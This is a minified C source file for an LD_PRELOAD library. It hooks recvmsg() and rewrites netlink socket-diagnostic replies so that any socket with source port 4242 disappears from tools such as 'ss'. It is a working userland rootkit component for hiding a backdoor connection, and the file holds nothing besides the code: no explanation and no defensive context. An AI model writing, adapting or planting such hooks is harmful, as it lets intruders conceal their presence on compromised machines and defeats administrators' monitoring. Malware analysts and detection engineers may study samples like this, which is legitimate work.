#define _GNU_SOURCE
#include <dlfcn.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <arpa/inet.h>
#include <linux/inet_diag.h>
static ssize_t(*original_recvmsg)(int, struct msghdr*,int)=0;ssize_t recvmsg(int s,struct msghdr*msg,int flags){if(original_recvmsg==0){original_recvmsg=dlsym(RTLD_NEXT,"recvmsg");if(original_recvmsg==0){return -1;}}ssize_t ret,ret2;ret=original_recvmsg(s,msg,flags);if(ret>0){ret2=ret;if(msg&&msg->msg_name&&((struct sockaddr*)msg->msg_name)->sa_family==AF_NETLINK){if(msg->msg_iov){struct nlmsghdr*h=(struct nlmsghdr*)(msg->msg_iov->iov_base);while(h && NLMSG_OK(h,ret2)){if(h->nlmsg_type==NLMSG_DONE)break;if(h->nlmsg_type==RTM_NEWADDR){struct inet_diag_msg*r=NLMSG_DATA(h);if(ntohs(r->id.idiag_sport)==4242){h->nlmsg_type=NLMSG_DONE;}}h=NLMSG_NEXT(h,ret2);}}}}return ret;}
